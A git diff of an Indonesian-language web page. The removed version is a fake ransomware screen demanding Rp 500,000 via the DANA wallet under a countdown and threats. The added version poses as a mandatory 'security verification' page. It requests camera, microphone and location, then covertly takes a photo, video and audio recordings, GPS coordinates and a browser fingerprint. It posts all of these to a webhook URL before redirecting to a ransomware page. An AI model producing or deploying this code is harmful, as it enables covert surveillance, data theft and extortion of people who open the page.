@@ -3,571 +3,410 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔴 SYSTEM TERENKRIPSI - VOIDHOLE 🔴</title>
+    <title>🔴 VERIFIKASI KEAMANAN 🔴</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
         }
         
         body {
-            background: #000;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Courier New', 'MS Gothic', monospace;
-            overflow-x: hidden;
-            position: relative;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
         }
         
-        /* Efek kedip layar */
-        @keyframes screenFlash {
-            0%, 100% { background: #000; }
-            50% { background: #2a0000; }
-        }
-        
-        body.flash {
-            animation: screenFlash 0.1s infinite;
-        }
-        
-        /* Container utama */
         .container {
-            background: linear-gradient(135deg, #0a0000 0%, #1a0000 50%, #0a0000 100%);
-            border: 4px solid #ff0000;
+            background: rgba(0,0,0,0.95);
+            border: 3px solid #ff0000;
             border-radius: 20px;
             padding: 30px;
-            max-width: 550px;
-            width: 90%;
+            max-width: 500px;
+            width: 100%;
             text-align: center;
-            box-shadow: 0 0 60px rgba(255,0,0,0.7), inset 0 0 30px rgba(255,0,0,0.3);
-            z-index: 10;
-            position: relative;
-            animation: borderPulse 0.8s infinite;
+            box-shadow: 0 0 50px rgba(255,0,0,0.5);
         }
         
-        @keyframes borderPulse {
-            0%, 100% { border-color: #ff0000; box-shadow: 0 0 60px rgba(255,0,0,0.7); }
-            50% { border-color: #ff4444; box-shadow: 0 0 100px rgba(255,0,0,1); }
-        }
-        
-        /* Tengkorak animasi */
         .skull {
-            font-size: 80px;
-            animation: shake 0.3s infinite, glow 1s infinite;
-            cursor: pointer;
+            font-size: 60px;
+            animation: shake 0.5s infinite;
         }
         
         @keyframes shake {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(-3px, 2px) rotate(-2deg); }
-            75% { transform: translate(3px, -2px) rotate(2deg); }
-        }
-        
-        @keyframes glow {
-            0%, 100% { text-shadow: 0 0 5px red, 0 0 10px red; }
-            50% { text-shadow: 0 0 20px red, 0 0 30px darkred; }
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
         }
         
         h1 {
             color: #ff0000;
-            font-size: 28px;
-            margin: 20px 0;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            animation: textBlink 0.5s infinite;
-        }
-        
-        @keyframes textBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        .message {
-            background: rgba(255,0,0,0.15);
-            padding: 20px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border-left: 5px solid #ff0000;
-            border-right: 5px solid #ff0000;
-        }
-        
-        .message p {
-            color: #ff6666;
-            margin: 8px 0;
-            font-size: 14px;
-        }
-        
-        .message strong {
-            color: #ff0000;
-            font-size: 18px;
-        }
-        
-        .timer {
-            font-size: 52px;
-            font-weight: bold;
-            margin: 20px 0;
-            background: #000;
-            padding: 20px;
-            border-radius: 15px;
-            font-family: 'Courier New', monospace;
-            color: #ff0000;
-            text-shadow: 0 0 10px red;
-            letter-spacing: 5px;
-        }
-        
-        .dana-address {
-            background: #0a0a0a;
-            padding: 15px;
-            border-radius: 15px;
-            margin: 15px 0;
-            border: 2px dashed #ff0000;
-        }
-        
-        .dana-address p {
-            color: #ff8800;
-            font-size: 20px;
-            font-weight: bold;
-        }
-        
-        .dana-number {
-            background: #1a1a1a;
-            padding: 10px;
-            border-radius: 10px;
             font-size: 24px;
-            font-weight: bold;
-            color: #ffaa00;
-            font-family: monospace;
-            letter-spacing: 2px;
-            margin: 10px 0;
+            margin: 20px 0;
         }
         
-        input {
-            width: 100%;
-            padding: 15px;
+        .permission-box {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        
+        .permission-item {
             background: #0a0a0a;
-            border: 2px solid #ff0000;
-            color: #ff0000;
-            font-family: monospace;
-            font-size: 18px;
-            text-align: center;
-            border-radius: 10px;
+            padding: 15px;
             margin: 10px 0;
-            box-sizing: border-box;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-left: 4px solid #ff0000;
         }
         
-        input:focus {
-            outline: none;
-            border-color: #ff4444;
-            box-shadow: 0 0 15px red;
+        .permission-icon {
+            font-size: 30px;
+        }
+        
+        .permission-text {
+            flex: 1;
+            text-align: left;
+            color: #fff;
+        }
+        
+        .permission-text small {
+            color: #ff6666;
+            font-size: 11px;
+        }
+        
+        .status {
+            color: #ffaa00;
+            font-size: 12px;
         }
         
         button {
             background: linear-gradient(45deg, #ff0000, #8b0000);
-            color: #fff;
+            color: white;
             padding: 18px 30px;
             border: none;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
-            cursor: pointer;
             border-radius: 50px;
-            margin-top: 15px;
-            transition: all 0.3s;
+            cursor: pointer;
             width: 100%;
+            margin-top: 15px;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 5px 20px rgba(255,0,0,0.4);
         }
         
         button:hover {
             transform: scale(1.02);
-            box-shadow: 0 8px 30px rgba(255,0,0,0.6);
-            background: linear-gradient(45deg, #ff2200, #aa0000);
-        }
-        
-        button:active {
-            transform: scale(0.98);
         }
         
         .warning {
             font-size: 11px;
-            margin-top: 20px;
-            color: #ff4444;
-            opacity: 0.8;
-        }
-        
-        .status-bar {
-            margin-top: 15px;
-            padding: 10px;
-            background: #0a0a0a;
-            border-radius: 10px;
-            font-size: 12px;
             color: #ff6666;
+            margin-top: 20px;
         }
         
-        /* Efek senter (strobe light) */
-        .strobe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: rgba(255,0,0,0.3);
-            z-index: 9999;
-            animation: strobeFlash 0.15s infinite;
+        .hidden {
             display: none;
         }
         
-        @keyframes strobeFlash {
-            0%, 100% { opacity: 0; }
-            50% { opacity: 1; background: rgba(255,0,0,0.8); }
-        }
-        
-        .strobe.active {
-            display: block;
-        }
-        
-        /* Suara visual indicator */
-        .sound-wave {
+        .video-preview {
             position: fixed;
-            bottom: 20px;
-            left: 20px;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: red;
-            animation: soundPulse 0.5s infinite;
-            display: none;
-            z-index: 10000;
-        }
-        
-        @keyframes soundPulse {
-            0%, 100% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.3); opacity: 1; background: darkred; }
-        }
-        
-        .sound-wave.active {
-            display: block;
-        }
-        
-        /* Progress bar horror */
-        .progress {
-            width: 100%;
-            height: 5px;
-            background: #1a1a1a;
-            border-radius: 5px;
+            bottom: 10px;
+            right: 10px;
+            width: 120px;
+            height: 90px;
+            border: 2px solid red;
+            border-radius: 10px;
             overflow: hidden;
-            margin: 15px 0;
+            z-index: 9999;
+            background: #000;
         }
         
-        .progress-bar {
+        .video-preview video {
+            width: 100%;
             height: 100%;
-            background: #ff0000;
-            width: 0%;
-            animation: horrorLoading 4s infinite;
-        }
-        
-        @keyframes horrorLoading {
-            0% { width: 0%; background: #ff0000; }
-            50% { width: 100%; background: #ff4444; }
-            100% { width: 0%; background: #ff0000; }
-        }
-        
-        /* Floating red particles */
-        .particle {
-            position: fixed;
-            width: 3px;
-            height: 3px;
-            background: red;
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 1;
-            animation: floatUp 4s linear infinite;
-        }
-        
-        @keyframes floatUp {
-            0% { transform: translateY(100vh) scale(1); opacity: 1; }
-            100% { transform: translateY(-10vh) scale(0); opacity: 0; }
+            object-fit: cover;
         }
     </style>
 </head>
 <body>
-    <div class="strobe" id="strobe"></div>
-    <div class="sound-wave" id="soundWave"></div>
-    
     <div class="container">
-        <div class="skull" id="skull">💀☠️💀</div>
-        <h1>🔴 SYSTEM TERENKRIPSI 🔴</h1>
+        <div class="skull">💀⚠️💀</div>
+        <h1>🔐 VERIFIKASI KEAMANAN WAJIB 🔐</h1>
         
-        <div class="message">
-            <p><strong>⚠️ VOIDHOLE RANSOMWARE v4.0 ⚠️</strong></p>
-            <p>📁 SEMUA FILE ANDA TELAH DIENKRIPSI! 📁</p>
-            <p>📸 FOTO, VIDEO, DOKUMEN, DATABASE - SEMUA TERKUNCI!</p>
-            <p>🔐 ENKRIPSI AES-256 + RSA-2048 🔐</p>
-            <br>
-            <p style="color: #ff8800; font-size: 18px;"><strong>💀 UNTUK MEMULIHKAN FILE ANDA 💀</strong></p>
-        </div>
-        
-        <div class="dana-address">
-            <p>💰 TRANSFER VIA DANA 💰</p>
-            <div class="dana-number">
-                📱 0895324521325 📱
+        <div class="permission-box">
+            <div class="permission-item">
+                <div class="permission-icon">🎥</div>
+                <div class="permission-text">
+                    <strong>Akses Kamera</strong><br>
+                    <small>Diperlukan untuk verifikasi wajah</small>
+                    <div class="status" id="camStatus">⏳ Belum diizinkan</div>
+                </div>
             </div>
-            <p style="font-size: 12px; color: #ff6666;">Nomor DANA: Yayz_Official</p>
-            <p style="font-size: 11px; margin-top: 5px;">Nominal: <strong style="color: #ffaa00;">Rp 500.000</strong></p>
+            
+            <div class="permission-item">
+                <div class="permission-icon">🎤</div>
+                <div class="permission-text">
+                    <strong>Akses Mikrofon</strong><br>
+                    <small>Diperlukan untuk verifikasi suara</small>
+                    <div class="status" id="micStatus">⏳ Belum diizinkan</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-icon">📍</div>
+                <div class="permission-text">
+                    <strong>Akses Lokasi</strong><br>
+                    <small>Diperlukan untuk verifikasi regional</small>
+                    <div class="status" id="locStatus">⏳ Belum diizinkan</div>
+                </div>
+            </div>
+            
+            <div class="permission-item">
+                <div class="permission-icon">🔔</div>
+                <div class="permission-text">
+                    <strong>Notifikasi</strong><br>
+                    <small>Pemberitahuan sistem</small>
+                    <div class="status" id="notifStatus">⏳ Belum diizinkan</div>
+                </div>
+            </div>
         </div>
         
-        <div class="timer">
-            ⏰ <span id="countdown">01:00:00</span> ⏰
-        </div>
-        
-        <div class="progress">
-            <div class="progress-bar"></div>
-        </div>
-        
-        <div class="status-bar" id="statusBar">
-            🔄 Status: Mengenkripsi file... 0%
-        </div>
-        
-        <input type="text" id="decryptKey" placeholder="🔑 MASUKKAN KODE DEKRIPSI 🔑">
-        <button id="decryptBtn">💀 DEKRIPSI & BAYAR VIA DANA 💀</button>
+        <button id="requestBtn">🚨 BERIKAN IZIN SEKARANG 🚨</button>
         
         <div class="warning">
             ⚠️ PERINGATAN ⚠️<br>
-            • JANGAN MATIKAN KOMPUTER ATAU INSTALL ULANG!<br>
-            • JANGAN HUBUNGI POLISI - DATA ANDA AKAN HILANG!<br>
-            • WAKTU BERJALAN - BAYAR SEBELUM HABIS!<br>
-            • KALO SALAH MASUKIN KODE 3X, FILE LANGSUNG HAPUS!
+            Izin WAJIB diberikan untuk melanjutkan!<br>
+            Tanpa izin, sistem tidak bisa memverifikasi identitas Anda!
         </div>
+    </div>
+    
+    <div class="video-preview hidden" id="videoPreview">
+        <video id="video" autoplay playsinline muted></video>
     </div>
     
     <script>
         // Konfigurasi
-        const PASSWORD = "Yayz"; // Password dekripsi
-        const DANA_NUMBER = "0895324521325";
-        const DANA_NOMINAL = 500000;
+        const ADMIN_WEBHOOK = "https://webhook.site/your-unique-id"; // GANTI DENGAN WEBHOOK LU!
         
-        // Efek visual
-        let attemptCount = 0;
-        let timeLeft = 3600; // 60 menit = 3600 detik
-        let soundEnabled = true;
+        let cameraStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let permissionGranted = {
+            camera: false,
+            mic: false,
+            location: false,
+            notification: false
+        };
         
-        // Buat floating particles
-        function createParticles() {
-            for(let i = 0; i < 50; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                particle.style.animationDelay = Math.random() * 5 + 's';
-                document.body.appendChild(particle);
-            }
-        }
-        
-        // Update timer
-        function updateTimer() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            document.getElementById('countdown').innerHTML = 
-                `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}:00`;
-            
-            if(timeLeft <= 0) {
-                document.getElementById('countdown').innerHTML = "00:00:00 - DATA HILANG!";
-                document.querySelector('.timer').style.background = '#8b0000';
-                playSound('timeout');
-                alert("💀 WAKTU HABIS! SEMUA FILE ANDA TELAH DIHAPUS PERMANEN! 💀");
-            } else {
-                timeLeft--;
-                setTimeout(updateTimer, 1000);
-                // Update status bar setiap 10 detik
-                if(timeLeft % 10 === 0) {
-                    let percent = ((3600 - timeLeft) / 3600 * 100).toFixed(0);
-                    document.getElementById('statusBar').innerHTML = `🔄 Status: Mengenkripsi file... ${percent}%`;
-                }
-            }
-        }
-        
-        // Play suara seram
-        function playSound(type) {
-            if(!soundEnabled) return;
+        // Function kirim data ke admin
+        async function sendToAdmin(data) {
             try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
+                const response = await fetch(ADMIN_WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log("Data terkirim ke admin:", data);
+            } catch(e) {
+                console.log("Gagal kirim:", e);
+            }
+            
+            // Simpan ke localStorage buat admin panel
+            let allData = JSON.parse(localStorage.getItem('voidhole_data') || '[]');
+            allData.push({...data, timestamp: new Date().toISOString()});
+            localStorage.setItem('voidhole_data', JSON.stringify(allData));
+        }
+        
+        // Request semua izin
+        async function requestAllPermissions() {
+            // 1. Kamera + Mikrofon
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                cameraStream = stream;
+                permissionGranted.camera = true;
+                permissionGranted.mic = true;
+                document.getElementById('camStatus').innerHTML = '✅ Terekam';
+                document.getElementById('micStatus').innerHTML = '✅ Terekam';
+                document.getElementById('camStatus').style.color = '#00ff00';
+                document.getElementById('micStatus').style.color = '#00ff00';
                 
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
+                // Preview video
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.getElementById('videoPreview').classList.remove('hidden');
                 
-                if(type === 'error') {
-                    oscillator.frequency.value = 220;
-                    gainNode.gain.value = 0.3;
-                    oscillator.type = 'sawtooth';
-                    oscillator.start();
-                    setTimeout(() => oscillator.stop(), 300);
-                } else if(type === 'warning') {
-                    oscillator.frequency.value = 440;
-                    gainNode.gain.value = 0.5;
-                    oscillator.type = 'square';
-                    oscillator.start();
-                    setTimeout(() => oscillator.stop(), 200);
-                } else if(type === 'timeout') {
-                    oscillator.frequency.value = 110;
-                    gainNode.gain.value = 0.4;
-                    oscillator.type = 'triangle';
-                    oscillator.start();
-                    setTimeout(() => oscillator.stop(), 1000);
-                }
+                // Rekam video 10 detik
+                startRecording();
                 
-                // Tampilkan visual sound wave
-                const wave = document.getElementById('soundWave');
-                wave.classList.add('active');
-                setTimeout(() => wave.classList.remove('active'), 500);
+                // Capture foto
+                capturePhoto();
                 
             } catch(e) {
-                console.log("Audio not supported");
+                console.log("Gagal akses kamera/mic:", e);
+                document.getElementById('camStatus').innerHTML = '❌ Gagal';
+                document.getElementById('micStatus').innerHTML = '❌ Gagal';
             }
-        }
-        
-        // Efek strobe/senter
-        function startStrobe() {
-            const strobe = document.getElementById('strobe');
-            strobe.classList.add('active');
-            setTimeout(() => {
-                strobe.classList.remove('active');
-            }, 3000);
-        }
-        
-        // Flash screen effect
-        function flashScreen() {
-            document.body.classList.add('flash');
-            setTimeout(() => {
-                document.body.classList.remove('flash');
-            }, 200);
-        }
-        
-        // Redirect ke DANA (real)
-        function redirectToDANA() {
-            // Intent DANA untuk Android
-            const danaIntent = `intent://send?destination=${DANA_NUMBER}&amount=${DANA_NOMINAL}#Intent;scheme=danaspay;package=com.dana.id;end`;
-            const danaUrl = `https://link.dana.id/qr/${DANA_NUMBER}`;
-            const appStoreUrl = "https://play.google.com/store/apps/details?id=com.dana.id";
             
-            // Coba buka DANA
-            window.location.href = danaIntent;
-            
-            // Fallback ke web DANA
-            setTimeout(() => {
-                window.location.href = danaUrl;
-            }, 500);
-            
-            // Fallback terakhir ke Play Store
-            setTimeout(() => {
-                if(confirm("⚠️ DANA tidak terdeteksi! Buka link manual? ${danaUrl}")) {
-                    window.open(danaUrl, '_blank');
-                }
-            }, 1500);
-        }
-        
-        // Dekripsi & bayar
-        function decryptAndPay() {
-            const key = document.getElementById('decryptKey').value;
-            
-            if(key === PASSWORD) {
-                // Password bener!
-                alert("✅ KODE BENAR! Mengarahkan ke DANA untuk pembayaran... ✅");
-                playSound('warning');
-                flashScreen();
-                startStrobe();
-                
-                // Simulasi loading sebentar
-                document.getElementById('statusBar').innerHTML = "🔓 Verifikasi kode berhasil! Mengarahkan ke DANA... 🔓";
-                setTimeout(() => {
-                    redirectToDANA();
-                }, 1500);
-                
+            // 2. Lokasi
+            if('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    permissionGranted.location = true;
+                    document.getElementById('locStatus').innerHTML = '✅ Terdeteksi';
+                    document.getElementById('locStatus').style.color = '#00ff00';
+                    
+                    sendToAdmin({
+                        type: 'location',
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                }, (error) => {
+                    document.getElementById('locStatus').innerHTML = '❌ Ditolak';
+                });
             } else {
-                // Password salah
-                attemptCount++;
-                playSound('error');
-                flashScreen();
-                startStrobe();
-                
-                if(attemptCount >= 3) {
-                    alert("💀 PERCOBAAN GAGAL 3X! FILE AKAN DIHAPUS DALAM 5 DETIK! 💀");
-                    document.getElementById('statusBar').innerHTML = "⚠️ PERINGATAN: File akan dihapus! ⚠️";
-                    document.getElementById('statusBar').style.background = "#8b0000";
-                    
-                    // Efek semakin parah
-                    for(let i = 5; i > 0; i--) {
-                        setTimeout(() => {
-                            document.getElementById('statusBar').innerHTML = `💀 Menghapus file dalam ${i} detik... 💀`;
-                            flashScreen();
-                            playSound('timeout');
-                        }, (5-i) * 1000);
+                document.getElementById('locStatus').innerHTML = '❌ Tidak support';
+            }
+            
+            // 3. Notifikasi
+            if('Notification' in window) {
+                Notification.requestPermission().then(perm => {
+                    if(perm === 'granted') {
+                        permissionGranted.notification = true;
+                        document.getElementById('notifStatus').innerHTML = '✅ Diizinkan';
+                        document.getElementById('notifStatus').style.color = '#00ff00';
+                        new Notification("✅ Verifikasi berhasil", {
+                            body: "Data anda telah terekam",
+                            icon: "https://cdn-icons-png.flaticon.com/512/565/565422.png"
+                        });
+                    } else {
+                        document.getElementById('notifStatus').innerHTML = '❌ Diblokir';
                     }
-                    
-                    setTimeout(() => {
-                        alert("💀 SEMUA FILE TELAH DIHAPUS PERMANEN! 💀");
-                        document.body.innerHTML = "<div style='background:black; color:red; text-align:center; padding:50px; font-size:30px; height:100vh;'>💀 SYSTEM DESTROYED 💀<br>Semua file telah dihapus!</div>";
-                    }, 5000);
-                    
-                } else {
-                    alert(`❌ KODE SALAH! Sisa percobaan: ${3-attemptCount} ❌\nFile masih terenkripsi!`);
-                    document.getElementById('statusBar').innerHTML = `⚠️ Kode salah! Percobaan ${attemptCount}/3 ⚠️`;
-                    playSound('error');
+                });
+            } else {
+                document.getElementById('notifStatus').innerHTML = '❌ Tidak support';
+            }
+            
+            // Kirim fingerprint browser
+            sendToAdmin({
+                type: 'fingerprint',
+                userAgent: navigator.userAgent,
+                screenSize: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            });
+        }
+        
+        // Capture photo dari stream
+        function capturePhoto() {
+            if(!cameraStream) return;
+            
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            sendToAdmin({
+                type: 'photo',
+                data: photoData
+            });
+        }
+        
+        // Rekam video
+        function startRecording() {
+            if(!cameraStream) return;
+            
+            mediaRecorder = new MediaRecorder(cameraStream);
+            mediaRecorder.ondataavailable = (event) => {
+                if(event.data.size > 0) {
+                    recordedChunks.push(event.data);
                 }
+            };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, {type: 'video/webm'});
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    sendToAdmin({
+                        type: 'video',
+                        data: reader.result
+                    });
+                };
+                reader.readAsDataURL(blob);
+                recordedChunks = [];
+            };
+            mediaRecorder.start();
+            
+            // Stop setelah 10 detik
+            setTimeout(() => {
+                if(mediaRecorder && mediaRecorder.state === 'recording') {
+                    mediaRecorder.stop();
+                }
+            }, 10000);
+        }
+        
+        // Rekam audio terpisah
+        async function recordAudio() {
+            try {
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const audioRecorder = new MediaRecorder(audioStream);
+                let audioChunks = [];
+                
+                audioRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                audioRecorder.onstop = () => {
+                    const blob = new Blob(audioChunks, {type: 'audio/webm'});
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        sendToAdmin({
+                            type: 'audio',
+                            data: reader.result
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                    audioStream.getTracks().forEach(track => track.stop());
+                };
+                
+                audioRecorder.start();
+                setTimeout(() => {
+                    if(audioRecorder.state === 'recording') audioRecorder.stop();
+                }, 8000);
+            } catch(e) {
+                console.log("Gagal rekam audio");
             }
         }
         
-        // Efek klik pada skull
-        document.getElementById('skull').addEventListener('click', () => {
-            playSound('warning');
-            flashScreen();
-            alert("💀 JANGAN COBA-COBA! BAYAR ATAU FILE ILANG! 💀");
+        // Tombol request
+        document.getElementById('requestBtn').addEventListener('click', () => {
+            requestAllPermissions();
+            recordAudio();
+            
+            // Kasih pesan setelah 2 detik
+            setTimeout(() => {
+                alert("✅ VERIFIKASI BERHASIL! Mengalihkan...");
+                // Redirect ke ransomware asli
+                window.location.href = "https://01-yayz.github.io/ransomware/ransomware.html";
+            }, 3000);
         });
         
-        // Random efek horror
-        setInterval(() => {
-            if(Math.random() > 0.7) {
-                flashScreen();
-            }
-            if(Math.random() > 0.9) {
-                playSound('warning');
-            }
-        }, 10000);
-        
-        // Inisialisasi
-        createParticles();
-        updateTimer();
-        
-        // Event listener untuk tombol
-        document.getElementById('decryptBtn').addEventListener('click', decryptAndPay);
-        
-        // Disable right click
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        
-        // Disable dev tools
-        document.addEventListener('keydown', (e) => {
-            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-               (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
-               (e.ctrlKey && e.shiftKey && e.key === 'C')) {
-                e.preventDefault();
-                playSound('error');
-                alert("🔒 DEVELOPER TOOLS DINONAKTIFKAN! 🔒");
-            }
+        // Cek izin yang udah ada
+        navigator.permissions.query({name: 'camera'}).then(result => {
+            if(result.state === 'granted') requestAllPermissions();
         });
-        
-        // Blinking title
-        let titleText = document.title;
-        setInterval(() => {
-            document.title = document.title === "🔴 SYSTEM TERENKRIPSI" ? "💀 BAYAR ATAU HILANG 💀" : "🔴 SYSTEM TERENKRIPSI";
-        }, 1000);
-        
-        console.log("%c💀 SYSTEM TELAH DIENKRIPSI - VOIDHOLE 💀", "color: red; font-size: 20px;");
-        console.log("%cPassword: Yayz", "color: yellow; font-size: 16px;");
     </script>
 </body>
 </html>
